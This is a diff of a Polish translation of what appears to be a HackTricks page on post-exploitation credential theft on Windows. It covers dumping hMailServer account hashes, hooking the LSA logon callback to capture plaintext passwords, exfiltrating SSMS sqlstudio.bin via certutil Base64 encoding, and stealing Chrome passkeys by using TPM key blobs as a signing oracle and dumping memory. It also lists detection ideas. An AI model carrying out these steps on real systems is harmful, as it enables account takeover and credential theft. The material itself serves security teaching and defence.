 $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
-Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Złamanie tych wartości może dostarczyć danych uwierzytelniających wielokrotnego użytku do pivotów WinRM/SSH.
+Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Cracking tych wartości może dostarczyć wielokrotnego użytku credentials do pivotów WinRM/SSH.
 
-## LSA Logon Callback Interception (LsaApLogonUserEx2)
+## Przechwytywanie wywołania zwrotnego logowania LSA (LsaApLogonUserEx2)
 
-Niektóre narzędzia przechwytują **hasła logowania w plaintext**, przechwytując callback logowania LSA `LsaApLogonUserEx2`. Idea polega na podpięciu hooka lub opakowaniu callbacku pakietu uwierzytelniania, aby dane uwierzytelniające zostały przechwycone **podczas logowania** (przed hashowaniem), a następnie zapisane na dysku lub zwrócone operatorowi. Zwykle jest to realizowane jako helper, który wstrzykuje się do LSA lub rejestruje w nim, a następnie rejestruje każde udane logowanie interaktywne/sieciowe wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>
+Niektóre narzędzia przechwytują **plaintext logon passwords**, przechwytując wywołanie zwrotne logowania LSA `LsaApLogonUserEx2`. Idea polega na podpięciu hooka lub opakowaniu callbacku pakietu uwierzytelniania, aby credentials zostały przechwycone **podczas logowania** (przed hashowaniem), a następnie zapisane na dysku lub zwrócone operatorowi. Zwykle jest to implementowane jako helper, który wstrzykuje się do LSA lub rejestruje w nim, a następnie zapisuje każde pomyślne zdarzenie logowania interaktywnego/sieciowego wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>
 
 Uwagi operacyjne:
-- Do załadowania helpera w ścieżce uwierzytelniania wymagane są uprawnienia lokalnego administratora/SYSTEM.
-- Przechwycone dane uwierzytelniające pojawiają się tylko wtedy, gdy nastąpi logowanie (interaktywne, RDP, usługi lub sieciowe — zależnie od hooka).
+- Wymaga lokalnych uprawnień administratora/SYSTEM do załadowania helpera w ścieżce uwierzytelniania.
+- Przechwycone credentials pojawiają się wyłącznie wtedy, gdy nastąpi logowanie (interaktywne, RDP, usługi lub sieciowe — zależnie od hooka).
 
-## SSMS Saved Connection Credentials (sqlstudio.bin)
+## Zapisane credentials połączeń SSMS (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS) przechowuje informacje o zapisanych połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane dumpers mogą przeanalizować ten plik i odzyskać zapisane dane uwierzytelniające SQL. W shellach, które zwracają wyłącznie wynik polecenia, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wyświetlenie na stdout.<sup>[[1]](#references)</sup>
+SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane dumpers potrafią przeanalizować ten plik i odzyskać zapisane credentials SQL. W shellach, które zwracają wyłącznie wynik polecenia, plik jest często eksfiltrowany przez zakodowanie go jako Base64 i wyświetlenie na stdout.<sup>[[1]](#references)</sup>
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
-Po stronie operatora odtwórz plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:
+Po stronie operatora odbuduj plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
-## Kradzież credentials Passkeys / WebAuthn z Chrome w systemie Windows
+## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w systemie Windows
 
-Jeśli na hoście Windows uzyskano wykonanie kodu jako **użytkownik ofiary**, korzystając z **Chrome + zsynchronizowanych passkeys w Google Password Manager**, passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>
+Jeśli uzyskano **code execution** jako **użytkownik będący ofiarą** na hoście Windows korzystającym z **Chrome + zsynchronizowanych Passkeys w Google Password Manager**, Passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>
 
 ### Interesujące lokalne artefakty
 ```text
 %LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
 %LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
 ```
-- **`Sync Data\LevelDB`** przechowuje zakodowane w formacie protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces tego samego użytkownika może wyliczyć **RP ID**, **nazwę użytkownika**, **ID poświadczenia** oraz zaszyfrowany materiał klucza prywatnego dla zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
-- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** oraz opakowany sekret używany do odzyskiwania zsynchronizowanych poświadczeń.<sup>[[4]](#references)</sup>
+- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces działający jako ten sam użytkownik może wyliczyć **RP ID**, **username**, **credential ID** oraz zaszyfrowany materiał klucza prywatnego dla zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
+- **`passkey_enclave_state`** przechowuje stan lokalnej rejestracji urządzenia, taki jak **`wrapped_identity_private_key`**, oraz opakowany sekret używany do odzyskiwania zsynchronizowanych danych uwierzytelniających.<sup>[[4]](#references)</sup>
 
 Szybki triage:
 ```powershell
@@ -397,40 +397,40 @@ Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
 Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
 Select-Object FullName, Length, LastWriteTime
 ```
-### Obiekty blob kluczy powiązanych z TPM nadal mogą być wykorzystywane jako lokalny signing oracle
+### Obiekty blob klucza powiązane z TPM nadal mogą być wykorzystywane jako lokalna wyrocznia podpisywania
 
-Jeśli przeglądarka eksportuje klucz tożsamości wspierany przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten blob w stanie dostępnym dla użytkownika, malware **nie musi wyodrębniać surowego klucza prywatnego**. Może po prostu ponownie zaimportować blob na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>
+Jeśli przeglądarka eksportuje klucz tożsamości chroniony przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten obiekt blob w stanie dostępnym dla użytkownika, malware **nie musi** wyodrębniać surowego klucza prywatnego. Może po prostu ponownie zaimportować obiekt blob na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>
 ```c
 NCryptOpenStorageProvider(...)
 NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
 NCryptSignHash(...)
 ```
-Oznacza to, że **hardware binding zapobiega eksportowi poza urządzenie, ale nie uniemożliwia użycia przez tego samego użytkownika na przejętym endpointcie**.
+Oznacza to, że **wiązanie sprzętowe zapobiega eksportowi poza urządzenie, ale nie użyciu przez tego samego użytkownika na przejętym endpointcie**.
 
 ### Praktyczne ścieżki nadużycia
 
 1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
 - Wylicz `WebauthnCredentialSpecifics` z Chrome LevelDB.
 - Rozpocznij logowanie za pomocą passkey i uzyskaj świeże wyzwanie WebAuthn.
-- Użyj skradzionego bloku `wrapped_identity_private_key` na TPM ofiary, aby podpisać binding żądania cloud-authenticator.
+- Użyj skradzionego bloku `wrapped_identity_private_key` w TPM ofiary do podpisania powiązania żądania cloud-authenticator.
 - Przekaż zwrócone assertion do relying party.
-- Jest to szczególnie cenne, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertions z **`UV=0`**.
+- Jest to szczególnie wartościowe, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertion z **`UV=0`**.
 2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
-- Wymuś ponowne onboardowanie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
-- Jeśli onboardowanie pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego klucz publiczny UV.
-- Jeśli provider nie weryfikuje attestation / pochodzenia z secure hardware dla nowego klucza UV, późniejsze signatures z klucza atakującego są traktowane jako **`UV=1`**.
+- Wymuś ponowne onboarding, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
+- Jeśli onboarding pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego klucz publiczny UV.
+- Jeśli provider nie weryfikuje attestation / pochodzenia klucza UV z secure hardware, późniejsze podpisy kluczem atakującego są traktowane jako **`UV=1`**.
 3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
 - Wymuś recovery lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany master secret passkey.
-- Obserwuj ponowne utworzenie lub modyfikację `passkey_enclave_state`, a następnie zrzut pamięci Chrome, gdy jawny **security domain secret (SDS)** znajduje się w pamięci.
+- Obserwuj ponowne utworzenie/modyfikację `passkey_enclave_state`, a następnie wykonaj dump pamięci Chrome, gdy jawny **security domain secret (SDS)** znajduje się w pamięci.
 - Użyj odzyskanego SDS do odszyfrowania zaszyfrowanych pól w każdym rekordzie `WebauthnCredentialSpecifics` i odzyskaj przenośne klucze prywatne WebAuthn.
 
-### Pomysły dotyczące DFIR / detekcji
+### Pomysły dotyczące DFIR / wykrywania
 
 - Monitoruj **usuwanie/ponowne tworzenie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
-- Generuj alerty dotyczące nietypowego dostępu do Chrome **`Sync Data\LevelDB`** przez procesy niebędące przeglądarką.
+- Generuj alerty dotyczące nietypowego dostępu procesów innych niż przeglądarki do Chrome **`Sync Data\LevelDB`**.
 - Generuj alerty dotyczące **zrzutów pamięci Chrome** lub podejrzanego dostępu do pamięci między procesami.
-- Analizuj powtarzające się monity o **Google Password Manager recovery PIN** lub nieoczekiwane ponowne onboardowanie.
-- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatny w przypadku zsynchronizowanych passkeys, ponieważ może pozostać stały, przez co klasyczne wykrywanie klonów jest mało skuteczne.
+- Zbadaj powtarzające się monity o **Google Password Manager recovery PIN** lub nieoczekiwane ponowne onboarding.
+- Pamiętaj, że WebAuthn **`signCount`** często nie jest użyteczne w przypadku zsynchronizowanych passkeys, ponieważ może pozostawać stałe, dlatego klasyczne wykrywanie klonów jest słabe.
 
 ## References
 
@@ -442,5 +442,6 @@ Oznacza to, że **hardware binding zapobiega eksportowi poza urządzenie, ale ni
 - [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
 - [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 - [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
 
 {{#include ../../banners/hacktricks-training.md}}
